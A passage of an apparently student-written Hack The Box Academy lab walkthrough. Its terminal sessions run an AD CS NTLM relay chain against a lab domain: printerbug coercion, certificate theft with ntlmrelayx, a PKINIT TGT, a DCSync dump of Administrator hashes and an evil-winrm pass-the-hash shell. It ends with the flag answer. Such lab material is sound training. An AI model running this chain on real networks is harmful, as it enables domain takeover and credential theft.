└──╼ [★]$ pip3 show pyOpenSSL cryptography 2>/dev/null | grep -E "Name|Version"
Name: pyOpenSSL
Version: 25.0.0
License: Apache License, Version 2.0
Name: cryptography
Version: 43.0.0
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~]
└──╼ [★]$ sudo pip3 install pyopenssl==23.2.0 cryptography==41.0.7 --break-system-packages --ignore-installed cffi
Collecting pyopenssl==23.2.0
  Using cached pyOpenSSL-23.2.0-py3-none-any.whl.metadata (10 kB)
Collecting cryptography==41.0.7
  Using cached cryptography-41.0.7-cp37-abi3-manylinux_2_28_x86_64.whl.metadata (5.2 kB)
Collecting cffi
  Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.5 kB)
Collecting pycparser (from cffi)
  Using cached pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
Using cached pyOpenSSL-23.2.0-py3-none-any.whl (59 kB)
Using cached cryptography-41.0.7-cp37-abi3-manylinux_2_28_x86_64.whl (4.4 MB)
Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (221 kB)
Using cached pycparser-3.0-py3-none-any.whl (48 kB)
Installing collected packages: pycparser, cffi, cryptography, pyopenssl
ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
azure-cli 2.74.0 requires azure-mgmt-batchai==7.0.0b1, which is not installed.
azure-cli 2.74.0 requires azure-storage-common~=1.4, which is not installed.
azure-cli 2.74.0 requires pycomposefile>=0.0.32, which is not installed.
fabric 2.6.0 requires pathlib2, which is not installed.
pwntools 4.14.1 requires unix-ar; python_version >= "3.6", which is not installed.
azure-ai-evaluation 1.8.0 requires promptflow-core>=1.17.1, which is not installed.
azure-ai-evaluation 1.8.0 requires promptflow-devkit>=1.17.1, which is not installed.
azure-monitor-opentelemetry-exporter 1.0.0b37 requires fixedint==0.1.6, which is not installed.
azure-monitor-opentelemetry-exporter 1.0.0b37 requires opentelemetry-api>=1.26, which is not installed.
azure-monitor-opentelemetry-exporter 1.0.0b37 requires opentelemetry-sdk>=1.26, which is not installed.
mitmproxy 12.2.0 requires mitmproxy_rs<0.13,>=0.12.6, which is not installed.
azure-cli-core 2.74.0 requires microsoft-security-utilities-secret-masker~=1.0.0b4, which is not installed.
azure-cli-core 2.74.0 requires py-deviceid, which is not installed.
azure-eventhub-checkpointstoreblob-aio 1.2.1 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
awscli 2.23.6 requires awscrt==0.23.4, but you have awscrt 1.0.0.dev0 which is incompatible.
awscli 2.23.6 requires distro<1.9.0,>=1.5.0, but you have distro 1.9.0 which is incompatible.
awscli 2.23.6 requires docutils<0.20,>=0.10, but you have docutils 0.21.2 which is incompatible.
awscli 2.23.6 requires prompt-toolkit<3.0.39,>=3.0.24, but you have prompt-toolkit 3.0.51 which is incompatible.
awscli 2.23.6 requires ruamel.yaml<=0.17.21,>=0.15.0, but you have ruamel-yaml 0.18.10 which is incompatible.
awscli 2.23.6 requires ruamel.yaml.clib<=0.2.8,>=0.2.0, but you have ruamel-yaml-clib 0.2.12 which is incompatible.
awscli 2.23.6 requires urllib3<1.27,>=1.25.4, but you have urllib3 2.3.0 which is incompatible.
awscli 2.23.6 requires zipp<3.21.0, but you have zipp 3.21.0 which is incompatible.
impacket 0.12.0 requires pyOpenSSL==24.0.0, but you have pyopenssl 23.2.0 which is incompatible.
azure-storage-queue 12.13.0 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
azure-cli 2.74.0 requires antlr4-python3-runtime~=4.13.1, but you have antlr4-python3-runtime 4.9.2 which is incompatible.
azure-cli 2.74.0 requires azure-cosmos>=3.0.2,~=3.0, but you have azure-cosmos 4.12.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-data-tables==12.4.0, but you have azure-data-tables 12.8.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-datalake-store~=1.0.0a0, but you have azure-datalake-store 0.0.53 which is incompatible.
azure-cli 2.74.0 requires azure-keyvault-administration==4.4.0b2, but you have azure-keyvault-administration 4.6.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-keyvault-certificates==4.7.0, but you have azure-keyvault-certificates 4.10.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-keyvault-keys==4.11.0b1, but you have azure-keyvault-keys 4.11.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-keyvault-secrets==4.7.0, but you have azure-keyvault-secrets 4.10.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-keyvault-securitydomain==1.0.0b1, but you have azure-keyvault-securitydomain 1.0.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-advisor==9.0.0, but you have azure-mgmt-advisor 10.0.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-apimanagement==4.0.0, but you have azure-mgmt-apimanagement 5.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-appconfiguration==3.1.0, but you have azure-mgmt-appconfiguration 4.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-appcontainers==2.0.0, but you have azure-mgmt-appcontainers 3.2.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-applicationinsights~=1.0.0, but you have azure-mgmt-applicationinsights 4.1.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-batch~=17.3.0, but you have azure-mgmt-batch 18.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-billing==6.0.0, but you have azure-mgmt-billing 7.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-cdn==12.0.0, but you have azure-mgmt-cdn 13.1.1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-cognitiveservices~=13.5.0, but you have azure-mgmt-cognitiveservices 13.7.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-containerregistry==14.0.0, but you have azure-mgmt-containerregistry 14.1.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-databoxedge~=1.0.0, but you have azure-mgmt-databoxedge 2.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-datamigration~=10.0.0, but you have azure-mgmt-datamigration 10.1.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-dns~=8.0.0, but you have azure-mgmt-dns 8.2.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-eventgrid==10.2.0b2, but you have azure-mgmt-eventgrid 10.4.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-eventhub~=10.1.0, but you have azure-mgmt-eventhub 11.2.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-extendedlocation==1.0.0b2, but you have azure-mgmt-extendedlocation 2.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-hdinsight==9.0.0b3, but you have azure-mgmt-hdinsight 9.1.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-imagebuilder~=1.3.0, but you have azure-mgmt-imagebuilder 1.4.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-iothub==3.0.0, but you have azure-mgmt-iothub 4.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-iothubprovisioningservices==1.1.0, but you have azure-mgmt-iothubprovisioningservices 1.2.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-loganalytics==13.0.0b4, but you have azure-mgmt-loganalytics 13.0.0b7 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-managementgroups~=1.0.0, but you have azure-mgmt-managementgroups 1.1.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-maps~=2.0.0, but you have azure-mgmt-maps 2.1.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-marketplaceordering==1.1.0, but you have azure-mgmt-marketplaceordering 1.2.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-media~=9.0, but you have azure-mgmt-media 10.2.1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-msi~=7.0.0, but you have azure-mgmt-msi 7.1.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-netapp~=10.1.0, but you have azure-mgmt-netapp 14.0.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-postgresqlflexibleservers==1.1.0b2, but you have azure-mgmt-postgresqlflexibleservers 1.2.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-privatedns~=1.0.0, but you have azure-mgmt-privatedns 1.2.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-rdbms==10.2.0b17, but you have azure-mgmt-rdbms 10.2.0b18 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-redhatopenshift~=1.5.0, but you have azure-mgmt-redhatopenshift 2.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-resource==23.3.0, but you have azure-mgmt-resource 23.4.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-security==6.0.0, but you have azure-mgmt-security 7.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-servicebus~=8.2.0, but you have azure-mgmt-servicebus 9.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-servicefabric~=2.1.0, but you have azure-mgmt-servicefabric 2.2.0b1 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-servicefabricmanagedclusters==2.1.0b1, but you have azure-mgmt-servicefabricmanagedclusters 2.1.0b2 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-sqlvirtualmachine==1.0.0b5, but you have azure-mgmt-sqlvirtualmachine 1.0.0b6 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-synapse==2.1.0b5, but you have azure-mgmt-synapse 2.1.0b7 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-trafficmanager~=1.0.0, but you have azure-mgmt-trafficmanager 1.1.0 which is incompatible.
azure-cli 2.74.0 requires azure-mgmt-web==7.3.1, but you have azure-mgmt-web 8.0.0 which is incompatible.
azure-cli 2.74.0 requires azure-monitor-query==1.2.0, but you have azure-monitor-query 1.4.2 which is incompatible.
azure-cli 2.74.0 requires azure-synapse-accesscontrol~=0.5.0, but you have azure-synapse-accesscontrol 0.8.0 which is incompatible.
azure-cli 2.74.0 requires azure-synapse-managedprivateendpoints~=0.4.0, but you have azure-synapse-managedprivateendpoints 0.5.0 which is incompatible.
azure-cli 2.74.0 requires azure-synapse-spark~=0.7.0, but you have azure-synapse-spark 0.8.0 which is incompatible.
azure-cli 2.74.0 requires fabric~=3.2.2, but you have fabric 2.6.0 which is incompatible.
azure-cli 2.74.0 requires javaproperties~=0.5.1, but you have javaproperties 0.8.2 which is incompatible.
azure-cli 2.74.0 requires jsondiff~=2.0.0, but you have jsondiff 2.1.2 which is incompatible.
azure-cli 2.74.0 requires PyGithub~=1.38, but you have pygithub 2.6.1 which is incompatible.
azure-cli 2.74.0 requires scp~=0.13.2, but you have scp 0.15.0 which is incompatible.
azure-cli 2.74.0 requires websocket-client~=1.3.1, but you have websocket-client 1.8.0 which is incompatible.
azure-eventhub-checkpointstoreblob 1.2.1 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
fabric 2.6.0 requires invoke<2.0,>=1.3, but you have invoke 2.2.0 which is incompatible.
azure-storage-file-share 12.22.0 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
azure-ai-evaluation 1.8.0 requires openai>=1.78.0, but you have openai 1.69.0 which is incompatible.
azure-confidentialledger 1.2.0b2 requires isodate<1.0.0,>=0.6.1, but you have isodate 0.0.0 which is incompatible.
mitmproxy 12.2.0 requires argon2-cffi<=25.1.0,>=23.1.0, but you have argon2-cffi 21.1.0 which is incompatible.
mitmproxy 12.2.0 requires bcrypt<=5.0.0,>=5.0.0, but you have bcrypt 4.2.0 which is incompatible.
mitmproxy 12.2.0 requires cryptography<=46.1,>=42.0, but you have cryptography 41.0.7 which is incompatible.
mitmproxy 12.2.0 requires pyOpenSSL<=25.3.0,>=24.3, but you have pyopenssl 23.2.0 which is incompatible.
mitmproxy 12.2.0 requires pyperclip<=1.11.0,>=1.9.0, but you have pyperclip 1.8.2 which is incompatible.
mitmproxy 12.2.0 requires tornado<=6.5.2,>=6.5.0, but you have tornado 6.4.2 which is incompatible.
mitmproxy 12.2.0 requires zstandard<=0.25.0,>=0.25, but you have zstandard 0.23.0 which is incompatible.
azure-cli-core 2.74.0 requires argcomplete~=3.5.2, but you have argcomplete 3.6.2 which is incompatible.
azure-cli-core 2.74.0 requires knack~=0.11.0, but you have knack 0.12.0 which is incompatible.
azure-cli-core 2.74.0 requires msal-extensions==1.2.0, but you have msal-extensions 1.3.1 which is incompatible.
azure-keyvault-keys 4.11.0b2 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
aioquic 1.2.0 requires cryptography>=42.0.0, but you have cryptography 41.0.7 which is incompatible.
aioquic 1.2.0 requires pyopenssl>=24, but you have pyopenssl 23.2.0 which is incompatible.
azure-storage-blob 12.26.0 requires isodate>=0.6.1, but you have isodate 0.0.0 which is incompatible.
Successfully installed cffi-2.1.1 cryptography-41.0.7 pycparser-3.0 pyopenssl-23.2.0
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~]
└──╼ [★]$ pip3 show pyOpenSSL cryptography 2>/dev/null | grep -E "Name|Version"
Name: pyOpenSSL
Version: 23.2.0
License: Apache License, Version 2.0
Name: cryptography
Version: 41.0.7
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~]
└──╼ [★]$ pip3 show pyOpenSSL | grep Version
Version: 23.2.0
License: Apache License, Version 2.0
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~]
└──╼ [★]$ sudo impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
Exception in thread Thread-2:
Traceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1043, in _bootstrap_inner
    self.run()
    ~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 572, in run
    self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)
                  ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 47, in __init__
    socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/socketserver.py", line 457, in __init__
    self.server_bind()
    ~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/socketserver.py", line 478, in server_bind
    self.socket.bind(self.server_address)
    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
OSError: [Errno 98] Address already in use
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.129.234.172 as INLANEFREIGHT/DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[-] Authenticating against http://10.129.234.172 as / FAILED
[*] GOT CERTIFICATE! ID 31
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```
- Terminal 2:
```bash
─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/krbrelayx]
└──╼ [★]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.174 10.10.14.98
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.174
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/krbrelayx]
└──╼ [★]$ ls -la ~/DC01\$.pfx
-rw-r--r-- 1 root root 4529 Aug  5 05:12 '/home/htb-ac-2162140/DC01$.pfx'
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/krbrelayx]
└──╼ [★]$ cd ~/PKINITtools/PKINITtools
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ~/DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
Traceback (most recent call last):
  File "/home/htb-ac-2162140/PKINITtools/PKINITtools/gettgtpkinit.py", line 19, in <module>
    from oscrypto.keys import parse_pkcs12, parse_certificate, parse_private
ModuleNotFoundError: No module named 'oscrypto'
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ pip3 install oscrypto
Defaulting to user installation because normal site-packages is not writeable
Collecting oscrypto
  Using cached oscrypto-1.3.0-py2.py3-none-any.whl.metadata (15 kB)
Requirement already satisfied: asn1crypto>=1.5.1 in /usr/lib/python3/dist-packages (from oscrypto) (1.5.1)
Using cached oscrypto-1.3.0-py2.py3-none-any.whl (194 kB)
Installing collected packages: oscrypto
Successfully installed oscrypto-1.3.0
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ~/DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
Traceback (most recent call last):
  File "/home/htb-ac-2162140/PKINITtools/PKINITtools/gettgtpkinit.py", line 26, in <module>
    from minikerberos import logger
ModuleNotFoundError: No module named 'minikerberos'
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ ls
getnthash.py     gettgtpkinit.py  ntlmrelayx  requirements.txt
gets4uticket.py  LICENSE          README.md
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt 
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.12.0)
Collecting minikerberos (from -r requirements.txt (line 2))
  Using cached minikerberos-0.4.9-py3-none-any.whl.metadata (735 bytes)
Requirement already satisfied: pyasn1>=0.2.3 in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (0.6.1)
Requirement already satisfied: pyasn1_modules in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (0.4.1)
Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (3.20.0)
Collecting pyOpenSSL==24.0.0 (from impacket->-r requirements.txt (line 1))
  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)
Requirement already satisfied: six in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (1.17.0)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (2.9.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (0.9.4)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (3.1.1)
Requirement already satisfied: setuptools in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (78.1.1)
Requirement already satisfied: charset_normalizer in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (3.4.2)
Requirement already satisfied: cryptography<43,>=41.0.5 in /usr/local/lib/python3.13/dist-packages (from pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 1)) (41.0.7)
Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.13/dist-packages (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 1)) (2.1.1)
Requirement already satisfied: asn1crypto>=1.5.1 in /usr/lib/python3/dist-packages (from minikerberos->-r requirements.txt (line 2)) (1.5.1)
Requirement already satisfied: oscrypto>=1.3.0 in /home/htb-ac-2162140/.local/lib/python3.13/site-packages (from minikerberos->-r requirements.txt (line 2)) (1.3.0)
Collecting asysocks>=0.2.18 (from minikerberos->-r requirements.txt (line 2))
  Using cached asysocks-0.2.18-py3-none-any.whl.metadata (435 bytes)
Collecting unicrypto>=0.0.12 (from minikerberos->-r requirements.txt (line 2))
  Using cached unicrypto-0.0.12-py3-none-any.whl.metadata (386 bytes)
Requirement already satisfied: tqdm in /usr/lib/python3/dist-packages (from minikerberos->-r requirements.txt (line 2)) (4.67.1)
Requirement already satisfied: h11>=0.14.0 in /usr/lib/python3/dist-packages (from asysocks>=0.2.18->minikerberos->-r requirements.txt (line 2)) (0.14.0)
Requirement already satisfied: pycparser in /usr/local/lib/python3.13/dist-packages (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 1)) (3.0)
Requirement already satisfied: blinker>=1.9.0 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (1.9.0)
Requirement already satisfied: click>=8.1.3 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (8.1.8)
Requirement already satisfied: itsdangerous>=2.2.0 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (2.2.0)
Requirement already satisfied: jinja2>=3.1.2 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (3.1.6)
Requirement already satisfied: markupsafe>=2.1.1 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (2.1.5)
Requirement already satisfied: werkzeug>=3.1.0 in /usr/lib/python3/dist-packages (from flask>=1.0->impacket->-r requirements.txt (line 1)) (3.1.3)
Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)
Using cached minikerberos-0.4.9-py3-none-any.whl (162 kB)
Using cached asysocks-0.2.18-py3-none-any.whl (149 kB)
Using cached unicrypto-0.0.12-py3-none-any.whl (75 kB)
Installing collected packages: unicrypto, pyOpenSSL, asysocks, minikerberos
ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
mitmproxy 12.2.0 requires mitmproxy_rs<0.13,>=0.12.6, which is not installed.
azure-cli-core 2.74.0 requires microsoft-security-utilities-secret-masker~=1.0.0b4, which is not installed.
azure-cli-core 2.74.0 requires py-deviceid, which is not installed.
mitmproxy 12.2.0 requires argon2-cffi<=25.1.0,>=23.1.0, but you have argon2-cffi 21.1.0 which is incompatible.
mitmproxy 12.2.0 requires bcrypt<=5.0.0,>=5.0.0, but you have bcrypt 4.2.0 which is incompatible.
mitmproxy 12.2.0 requires cryptography<=46.1,>=42.0, but you have cryptography 41.0.7 which is incompatible.
mitmproxy 12.2.0 requires pyOpenSSL<=25.3.0,>=24.3, but you have pyopenssl 24.0.0 which is incompatible.
mitmproxy 12.2.0 requires pyperclip<=1.11.0,>=1.9.0, but you have pyperclip 1.8.2 which is incompatible.
mitmproxy 12.2.0 requires tornado<=6.5.2,>=6.5.0, but you have tornado 6.4.2 which is incompatible.
mitmproxy 12.2.0 requires zstandard<=0.25.0,>=0.25, but you have zstandard 0.23.0 which is incompatible.
azure-cli-core 2.74.0 requires argcomplete~=3.5.2, but you have argcomplete 3.6.2 which is incompatible.
azure-cli-core 2.74.0 requires knack~=0.11.0, but you have knack 0.12.0 which is incompatible.
azure-cli-core 2.74.0 requires msal-extensions==1.2.0, but you have msal-extensions 1.3.1 which is incompatible.
aioquic 1.2.0 requires cryptography>=42.0.0, but you have cryptography 41.0.7 which is incompatible.
Successfully installed asysocks-0.2.18 minikerberos-0.4.9 pyOpenSSL-24.0.0 unicrypto-0.0.12
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ~/DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
2026-08-05 05:14:01,260 minikerberos INFO     Loading certificate and key from file
2026-08-05 05:14:01,465 minikerberos INFO     Requesting TGT
2026-08-05 05:14:13,389 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-08-05 05:14:13,389 minikerberos INFO     ee1d2da7c7dc84a86a5dea34bc19c502e321e5a07aeb36525077d44106a84dc4
2026-08-05 05:14:13,391 minikerberos INFO     Saved TGT to file
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/dc.ccache
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
Administrator:des-cbc-md5:a1f262b50b64c46b
[*] Cleaning up... 
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i 10.129.234.174 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:'
                                        
Evil-WinRM shell v3.5
                                        
Error: Invalid hash format
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i 10.129.234.174 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c'
                                        
Evil-WinRM shell v3.5
                                        
Error: Invalid hash format
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i 10.129.234.174 -u Administrator -H 'fd02e525dd676fd8ca04e200d265f20c'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
a1fc497a8433f5a1b4c18274019a2cdb
```

**Answer:** `a1fc497a8433f5a1b4c18274019a2cdb`

---

[Back to Module Index](./README.md)
